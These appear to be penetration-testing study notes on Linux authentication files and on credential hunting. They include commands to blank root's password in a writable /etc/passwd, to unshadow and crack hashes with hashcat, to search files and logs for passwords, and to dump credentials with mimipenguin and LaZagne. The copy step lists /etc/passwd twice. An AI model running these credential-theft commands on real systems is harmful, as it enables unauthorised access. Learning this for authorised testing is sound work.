# Linux Authentication
- Different authentication mechanisms supported
- Most commonly: Pluggable Authentication Modules (PAM)
	- Modules respondible for this funcitonality like `pam_unix.so` are typically in `/usr/lib/x86_64-linux-gnu/security/`
	- `pam_unix.so` responsible for updating account ingo
		- Reads/writes to `/etc/passwd` and `/etc/shadow

`/etc/passwd`
- Info about every user, 7 fields
- Password field
	- rare cases it holds the actual password hash
	- usually find the value `x`, meaning it stored as hash in `/etc/shadow`
- If this is writeable (by mistake)
	- can just remove the password field for the `root user entirely`
	- `root::0:0:root:/root:/bin/bash
		- second field, password, is empty
	- then can just become root without password
		- `su`

`/etc/shadow`
- Solely responsible for password storage and management
- 9 fields
- Password field
	- If contains a character like `!` or `*`, user cannot login with Unix password, but other authentication methods like Kerberos can be used
	- Same if Password field empty, ie. no password required for login
	- Fixed format
		- `$<id>$<salt>$<hashed>

|ID|Cryptographic Hash Algorithm|
|---|---|
|`1`|[MD5](https://en.wikipedia.org/wiki/MD5)|
|`2a`|[Blowfish](https://en.wikipedia.org/wiki/Blowfish_\(cipher\))|
|`5`|[SHA-256](https://en.wikipedia.org/wiki/SHA-2)|
|`6`|[SHA-512](https://en.wikipedia.org/wiki/SHA-2)|
|`sha1`|[SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)|
|`y`|[Yescrypt](https://github.com/openwall/yescrypt)|
|`gy`|[Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1)|
|`7`|[Scrypt](https://en.wikipedia.org/wiki/Scrypt)|

Opasswd
- `pam_unix.so` can prevent users reusing old passwords
- Previous passwords stored in `/etc/security/opasswd` file
	- Take note of the kind of hash used!
		- Because the MD5 (`$1$`) algo significantly easier to crack than SHA-512

## Cracking Linux Credentials
1. Copy the 2 important files into temporary files
	- `sudo cp /etc/passwd /tmp/passwd.bak 
	- `sudo cp /etc/passwd /tmp/passwd.bak `
2. Use unshadow on the temporary files
	- `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
3. Attack the unshadowed file with JtR or hashcat
	- `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked`

# Credential Hunting
- Sources: 
	- Files - configs, databases, source code, cronjobs, SSH keys..
	- History - logs, CLI history
	- Memory - cache, in-mem processing
	- Key-rings - browser stored creds
- Everything is a file in Linux
	- Should go by categories
		- Config files, databases, notes, scripts, cronjobs, ssh keys
	- Searching for config files
		- `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done`
	- Or search directly 
		- `for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done`
			- For each file with file extension .cnf, search for 3 words: user, password, pass
	- Apply the same for other file extensions
		- `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done`
	- Searching for notes
		-  `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
	- Searching for scripts
		- `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done`
	- Cronjobs
		- `cat /etc/crontab`
	- History files
		- `cat .bash_history`
		- `.bashrc` and `.bash_profile` also can contain important information
	- Logs
		- Logs found in `/var/log/..
		- `for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done`

| **File**              | **Description**                                    |
| --------------------- | -------------------------------------------------- |
| `/var/log/messages`   | Generic system activity logs.                      |
| `/var/log/syslog`     | Generic system activity logs.                      |
| `/var/log/auth.log`   | (Debian) All authentication related logs.          |
| `/var/log/secure`     | (RedHat/CentOS) All authentication related logs.   |
| `/var/log/boot.log`   | Booting information.                               |
| `/var/log/dmesg`      | Hardware and drivers related information and logs. |
| `/var/log/kern.log`   | Kernel related warnings, errors and logs.          |
| `/var/log/faillog`    | Failed login attempts.                             |
| `/var/log/cron`       | Information related to cron jobs.                  |
| `/var/log/mail.log`   | All mail server related logs.                      |
| `/var/log/httpd`      | All Apache related logs.                           |
| `/var/log/mysqld.log` | All MySQL server related logs.                     |
|                       |                                                    |
- Memory and cache
	- Credentials stored in memory/in files to be reused
		- Mimi penguin
			- `sudo git clone https://github.com/huntergregal/mimipenguin
			- `sudo python3 mimipenguin.py`
			- or `sudo ./mimipenguin.sh`
		- LaZagne
			- `sudo git clone https://github.com/AlessandroZ/LaZagne
			- `sudo python2.7 laZagne.py all
		- Browser credentials
			- `python3 laZagne.py browsers`
			- or `python3.9 firefox_decrypt.py